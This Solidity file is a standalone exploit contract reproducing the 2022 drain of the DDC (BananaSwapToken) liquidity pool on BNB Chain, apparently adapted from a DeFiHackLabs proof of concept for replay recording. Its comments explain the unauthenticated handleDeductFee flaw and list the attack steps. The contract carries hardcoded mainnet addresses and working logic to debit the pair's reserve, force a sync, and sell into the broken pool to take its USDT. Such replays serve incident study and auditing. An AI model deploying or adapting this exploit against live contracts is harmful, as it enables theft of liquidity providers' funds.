// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the DDC (BananaSwapToken) pool-reserve drain
// (BSC, 2022-08-28). The DeFiHackLabs PoC runs the whole attack INLINE in the
// Foundry `ContractTest` (no standalone exploit contract); this file faithfully
// copies that inline logic into a self-contained contract so the recorder can
// deploy + record a single `attack()` call.

// VULNERABILITY: Unauthenticated arbitrary-from fee deduction in BananaSwapToken (DDC)
// Root cause (in vulnerable token, read-only here):
//   BananaSwapToken (0x443195...) implements ITokenAFeeHandler.
//   handleDeductFee is EXTERNAL and completely unauthenticated:
//     (from sources/.../contracts_banana_BananaSwapToken.sol:228)
//     function handleDeductFee(ActionType actionType, uint256 feeAmount, address from, address user) external override {
//         distributeFee(actionType, feeAmount, from, user);
//     }
//   distributeFee (line 159):
//     _balances[from] = _balances[from].sub(feeAmount);   // direct arbitrary debit
//     for each rewardType in configMaps[actionType]:
//         portion = (feeRatio * feeAmount) / totalFeeRatio
//         _balances[feeHandler] += portion;
//         emit Transfer(from, feeHandler, portion);
//   - No onlyOwner / onlyManager / msg.sender == from check.
//   - 'from' and 'user' are fully attacker-controlled parameters.
//   - Intended ONLY for internal self-calls (`this.handleDeductFee`) during fee-bearing transfers:
//       * normal user transfers (ActionType.Transfer)
//       * router-mediated buys/sells via transferFee/transferFromFee (ActionType.Buy/Sell etc.)
//   Because DDC is a fee token, the pair contract's DDC.balanceOf(pair) is treated as the reserve.
//   Calling handleDeductFee drains that balance (to configured handlers or lost) without any pair involvement or approval.
//   pair.sync() then commits the lie: reserves become (near-zero DDC, original USDT).
//   A subsequent sell of a small DDC amount (bought with 0.1 BNB) against the inflated price drains the USDT side completely.
//   Why no revert: sub() succeeds as long as amount <= balance (we leave 1 wei); no other guards in the fee path for contract 'from'.
//   Cross-reference to interfaces: handleDeductFee(uint8, uint256, address, address) -- note uint8 cast of ActionType.

// EXPLOIT STEPS:
// 1. Receive 0.1 ether (WBNB seed): address(WBNB).call{value: 0.1 ether}("") in attack() payable.
// 2. Acquire starter DDC position for the sell leg: _buyDDC() does WBNB.approve(router), 3-hop swap WBNB->USDT->DDC, then DDC.approve(router).
// 3. Compute drain amount against CURRENT on-chain pair balance (not cached reserve):
//      uint256 pairReserve = DDC.balanceOf(address(TargetPair));
//      uint256 amount = pairReserve - 1;
// 4. Trigger the vuln:
//      DDC.handleDeductFee(0 /*Buy*/, amount, address(TargetPair), address(this));
//    Inside token: _balances[TargetPair] -= amount; distribute per Buy config (may burn or route to handlers).
//    Attacker's DDC balance unchanged; pair's token balance is now ~0.
// 5. Reconcile reserves to the manipulated state:
//      TargetPair.sync();
//    (UniswapV2 Pair impl): updates reserve0/reserve1 = current balances. Invariant violated.
// 6. Dump the starter DDC into the poisoned pool:
//      _sellDDC() -> router.swapExactTokensForTokens(DDC.balanceOf(this), 0, [DDC, USDT], this, ...);
//    The getAmountOut math (reserveIn * amountOut / (reserveOut + ...)) now returns almost the entire USDT reserve.
// 7. Result: attacker holds drained USDT; original LPs' liquidity is extracted. No other preconditions (no admin role, no flash loan, no prior LP tokens).

contract DDCExploit {
    IERC20 internal constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IRouter internal constant TargetRouter = IRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125);
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ITokenAFeeHandler internal constant DDC = ITokenAFeeHandler(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1);
    IPair internal constant TargetPair = IPair(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0);

    function attack() external payable {
        // Step 1 — wrap the 0.1 BNB sent as msg.value into WBNB (seed capital).
        address(WBNB).call{value: 0.1 ether}("");
        _buyDDC();

        // Step 2 — the exploit: drain the pair's DDC balance to 1 wei via the
        // unauthenticated fee handler. `from` = the AMM pair, so distributeFee
        // debits the pair's reserve.
        // VULN TRIGGER (see VULNERABILITY header): handleDeductFee(0, amount, pair, this)
        // executes _balances[pair] = _balances[pair].sub(amount) + fee redistribution
        // with zero authorization. (BananaSwapToken:159 and :228)
        uint256 pairReserve = DDC.balanceOf(address(TargetPair));
        uint256 amount = pairReserve - 1;
        DDC.handleDeductFee(0, amount, address(TargetPair), address(this));

        // Step 3 — force the pair to adopt the depleted DDC balance as its
        // reserve (USDT untouched). x*y=k collapses.
        TargetPair.sync();

        // Step 4 — sell the (now hugely valuable vs reserves) DDC for USDT,
        // emptying the pair's USDT side.
        _sellDDC();
    }

    function _buyDDC() internal {
        WBNB.approve(address(TargetRouter), type(uint256).max);
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        path[2] = address(DDC);
        TargetRouter.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp);
        DDC.approve(address(TargetRouter), type(uint256).max);
    }

    function _sellDDC() internal {
        address[] memory path = new address[](2);
        path[0] = address(DDC);
        path[1] = address(USDT);
        TargetRouter.swapExactTokensForTokens(DDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
